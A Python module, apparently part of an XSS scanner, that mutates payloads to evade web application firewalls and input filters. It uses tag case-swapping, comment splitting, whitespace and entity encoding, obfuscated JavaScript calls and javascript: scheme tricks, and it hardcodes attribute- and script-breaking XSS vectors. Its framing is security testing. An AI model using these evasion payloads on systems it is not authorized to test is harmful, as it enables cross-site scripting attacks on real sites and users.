"""On-the-fly payload mutation engine (WAF / filter evasion).

The bundled corpus is large but finite; real filters differ per target. This
module derives fresh variants from a working-looking vector so the browser
oracle can find a bypass without hand-editing payloads.

Mutations are conservative: every generated variant must still carry the
per-scan canary (``__M__``) so reflection/execution detection stays reliable.
"""
import re

_MARK = "__M__"

_TAG_RE = re.compile(r"<\s*/?\s*([a-zA-Z][a-zA-Z0-9]*)")
_ATTR_RE = re.compile(r"\b(on[a-zA-Z]+)\s*=")
_SCHEME_RE = re.compile(r"(?i)javascript\s*:")
_CALL_RE = re.compile(r"\b(alert|confirm|prompt|print)\s*\(")


def _swapcase_tag(m):
    name = m.group(1)
    return m.group(0)[:m.start(1) - m.start(0)] + "".join(
        ch.upper() if i % 2 else ch.lower() for i, ch in enumerate(name))


def _comment_tag(m):
    name = m.group(1)
    if len(name) < 2:
        return m.group(0)
    mid = len(name) // 2
    return m.group(0)[:m.start(1) - m.start(0)] + name[:mid] + "<!---->" + name[mid:]


def _ws(m):
    return m.group(0)


def _entity_call(text, token):
    """HTML-entity encode letters of the JS call (works in HTML attr context)."""
    def repl(m):
        name = m.group(1)
        enc = "".join("&#%d;" % ord(ch) if ch.isalpha() else ch for ch in name)
        return enc + "("
    return _CALL_RE.sub(repl, text)


def _concat_call(text):
    return _CALL_RE.sub(
        lambda m: "window['%s'+'%s'](" % (m.group(1)[:3], m.group(1)[3:]), text)


def _split_call(text):
    return _CALL_RE.sub(
        lambda m: "self['%s'+'%s'](" % (m.group(1)[:2], m.group(1)[2:]), text)


def _js_escape(text):
    return _CALL_RE.sub(lambda m: "".join(
        "\\u%04x" % ord(ch) for ch in m.group(1)) + "(", text)


def _generic(payload):
    """Context-independent mutations."""
    out = []
    out.append(("case-tags", _TAG_RE.sub(_swapcase_tag, payload)))
    out.append(("case-events", _ATTR_RE.sub(
        lambda m: "".join(ch.upper() if i % 2 else ch.lower()
                          for i, ch in enumerate(m.group(1))) + "=", payload)))
    out.append(("comment-tag", _TAG_RE.sub(_comment_tag, payload)))
    out.append(("tab-ws", payload.replace(" ", "\t")))
    out.append(("nl-ws", payload.replace(" ", "\n")))
    out.append(("cr-ws", payload.replace(" ", "\r")))
    out.append(("ff-ws", payload.replace(" ", "\f")))
    out.append(("slash-ws", re.sub(r"(<[a-zA-Z][a-zA-Z0-9]*)\s+", r"\1/", payload)))
    out.append(("null-tail", payload + "%00"))
    out.append(("entity-call", _entity_call(payload, _MARK)))
    out.append(("js-escape-call", _js_escape(payload)))
    out.append(("concat-call", _concat_call(payload)))
    out.append(("split-call", _split_call(payload)))
    out.append(("backtick-call", re.sub(
        r"\b(alert|confirm|prompt|print)\s*\(([^()]*)\)",
        lambda m: "%s`%s`" % (m.group(1), m.group(2)), payload)))
    out.append(("no-paren-close", payload.rstrip(")")))
    out.append(("dup-tag", re.sub(r"(<[a-zA-Z][a-zA-Z0-9]*)", r"\1\1", payload, count=1)))
    out.append(("angle-entity", payload.replace("<", "&#60;").replace(">", "&#62;")))
    out.append(("comment-attr", payload.replace("=", "/**/=", 1)))
    return out


def _url(payload):
    out = []
    if _SCHEME_RE.search(payload):
        out.append(("scheme-case", _SCHEME_RE.sub(
            lambda m: m.group(0)[:2] + m.group(0)[2:].upper(), payload)))
        out.append(("scheme-tab", _SCHEME_RE.sub("java\tscript:", payload)))
        out.append(("scheme-nl", _SCHEME_RE.sub("java\nscript:", payload)))
        out.append(("scheme-cr", _SCHEME_RE.sub("java\rscript:", payload)))
        out.append(("scheme-entity", _SCHEME_RE.sub("javascript&colon;", payload)))
        out.append(("scheme-lead", _SCHEME_RE.sub(" javascript:", payload)))
    return out


def _attr(payload):
    out = []
    out.append(("break-dq-dq", '"><svg onload=alert(%r)>' % _MARK))
    out.append(("break-sq-sq", "'><svg onload=alert(%r)>" % _MARK))
    out.append(("autofocus", '\" autofocus onfocus=\"alert(%r)' % _MARK))
    out.append(("formaction", '\" formaction=\"javascript:alert(%r)' % _MARK))
    return out


def _script(payload):
    out = []
    out.append(("js-break-sq", "';alert(%r);//" % _MARK))
    out.append(("js-break-dq", '";alert(%r);//' % _MARK))
    out.append(("js-close", "</script><svg onload=alert(%r)>" % _MARK))
    out.append(("js-template", "${alert(%r)}" % _MARK))
    return out


def mutate(payload, context="html", limit=24):
    """Return a de-duplicated list of (name, mutated_payload)."""
    if _MARK not in payload:
        return []
    out = []
    out.extend(_generic(payload))
    ctx = (context or "html").lower()
    if ctx in ("url", "attr_dq", "attr_sq", "attr_unquoted"):
        out.extend(_url(payload))
    if ctx in ("attr_dq", "attr_sq", "attr_unquoted", "attr_name", "url"):
        out.extend(_attr(payload))
    if ctx in ("script", "script_string", "html"):
        out.extend(_script(payload))
    seen = {payload}
    final = []
    for name, val in out:
        if not val or val in seen:
            continue
        if _MARK not in val:
            continue
        seen.add(val)
        final.append(("mut:%s:%s" % (ctx, name), val))
        if limit and len(final) >= limit:
            break
    return final
